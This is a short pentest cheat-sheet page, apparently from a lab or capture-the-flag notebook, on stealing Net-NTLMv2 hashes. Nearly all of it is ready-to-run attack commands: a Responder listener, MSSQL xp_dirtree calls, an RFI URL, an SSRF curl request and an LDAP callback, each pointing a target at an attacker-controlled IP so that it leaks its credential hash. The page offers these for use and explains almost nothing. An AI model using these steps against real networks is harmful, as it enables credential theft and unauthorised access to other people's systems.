---
description: NTLM and Net-NTLMv2
---

# Init NTLMv2 Theft

## Wait on your network.

{% code overflow="wrap" %}
```bash
sudo responder -I tun0 -dw -v
```
{% endcode %}

You may see Net-NTLMv2 hashes automatically.&#x20;

<figure><img src="../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>

## Theft via SMB

See [SMB Responder](user-recon/smb-responder.md) section.&#x20;

## Theft via Database

{% code overflow="wrap" %}
```bash
Kali> sudo responder -I tun0 -v

# Database with mssqlclient.py
SQL> EXEC sp_helprotect 'xp_dirtree' 
SQL> master.sys.xp_dirtree '\\10.10.14.54\any\thing' # Kali IP 

# Database with sqsh 
1> use master;                                                                                                                                                                       
2> EXEC sp_helprotect 'xp_dirtree';                                                                                                                                                  
3> go  

1> exec master.dbo.xp_dirtree '\\10.10.14.54\any\thing'   # Kali IP 
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure>

## Theft via HTTB &#x20;

{% code overflow="wrap" %}
```bash
# Find a RFI vulnerability and then access to back to Kali
Kali> sudo responder -I tun0
Browser> http://school.flight.htb/index.php?view=//<Kali IP>/any/thing.txt

# Another example 
Kali> sudo responder -I tun0 -v
Kali> curl "http://192.168.206.165:8080/?url=http://192.168.49.206" 
```
{% endcode %}

## Theft via LDAP &#x20;

```bash
Kali> sudo responder -I tun0

# Target Windows OS 
# Access to Ldap, triggering back to Kali
# ldap://<Kali IP>:389
Target system or service> ldap://10.10.14.114:389
```
